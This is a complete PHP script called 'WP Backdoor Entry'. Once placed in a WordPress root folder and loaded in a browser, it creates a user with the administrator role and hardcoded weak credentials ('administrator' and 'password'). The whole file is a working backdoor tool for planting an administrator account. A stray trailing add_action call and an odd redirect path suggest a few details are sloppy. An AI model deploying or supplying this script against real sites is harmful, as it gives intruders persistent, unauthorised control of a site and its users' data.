<?php
/*

Script Name: WP Backdoor Entry
 
Description: A script to create a new user with Administrator role.
 
Usage: Copy this file into your WordPress root folder and execute the script via the browser.

*/

$wp_folder = '';
$username = 'administrator';
$password = 'password';
$email = 'mail69@example.com';

// Check if there is WordPress folder defined
if(!empty($wp_folder)) {
  $wp_load_path = $wp_folder .'/wp-load.php';
} else {
  $wp_load_path = 'wp-load.php';
}

// Verify if wp-load.php is exist
if (!file_exists($wp_load_path)) {
    echo "ERROR! wp-load.php does not exist!";
    echo '<br>';
    exit;
}

// Function execution to create the user with full administrator role
vc_create_administrator($username, $password, $email, $wp_load_path);
 
function vc_create_administrator($username, $password, $email, $wp_load_path) {
 
   include($wp_load_path);
  
   if (!username_exists($username)) {
     $user_id = wp_create_user($username, $password, $email);
     $user = new WP_User($user_id);
     $user->set_role('administrator');
     header("Location: wp-login.php/");
          
   } else {
 
         echo 'ERROR! - ' . $username . ' already exists!';
         echo '<br>';
         exit;
 
   }
 
}

add_action('init','vc_create_administrator');
